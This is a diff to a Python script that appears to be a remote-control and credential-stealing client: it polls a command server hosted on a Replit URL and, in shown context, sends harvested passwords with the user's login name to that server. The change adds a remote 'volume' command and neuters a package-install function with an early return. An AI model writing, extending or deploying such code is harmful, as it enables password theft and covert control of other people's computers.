@@ -3,6 +3,7 @@ import subprocess, sys
 
 def install_packages(packages):
     """Install a list of packages using pip."""
+    return
     for package in packages:
         print(f"Installing {package}...")
         try:
@@ -11,15 +12,17 @@ def install_packages(packages):
         except subprocess.CalledProcessError as e:
             print(f"Failed to install {package}: {e}")
 
-# install_packages([
-#         'itsdangerous',
-#         'requests',
-#         'netifaces',
-#         'asyncio',
-#         'pyautogui',
-#         'pycryptodome',
-#         'Flask'
-# ])
+install_packages([
+        'itsdangerous',
+        'requests',
+        'netifaces',
+        'asyncio',
+        'pyautogui',
+        'pycryptodome',
+        'flask',
+        'pycaw',
+        'volume-control'
+])
 
 import subprocess
 import sys
@@ -39,6 +42,9 @@ import time
 from itsdangerous import exc
 from flask import jsonify
 import urllib.parse
+import ctypes
+import pyvolume
+
 
 URL = "https://62d00077-98c1-400d-9c7d-d9148d8ec7b6-00-37654x8qsze2r.spock.replit.dev/"
 current_directory = os.path.dirname(os.path.abspath(__file__))
@@ -208,6 +214,13 @@ def listen():
                     CAN_EXECUTE = False
                     passwords_var = take_passwords()
                     requests.get(f"{URL}/passwords?target={os.getlogin()}&state=false&passwords={passwords_var}")
+                    
+                elif response.json().get("command") == "volume" and i == "volume":
+                    reset_cmd()
+                    CAN_EXECUTE = False
+                    pyvolume.custom(percent=int(v))
+                    
+                
 
             time.sleep(5)
             CAN_EXECUTE = True
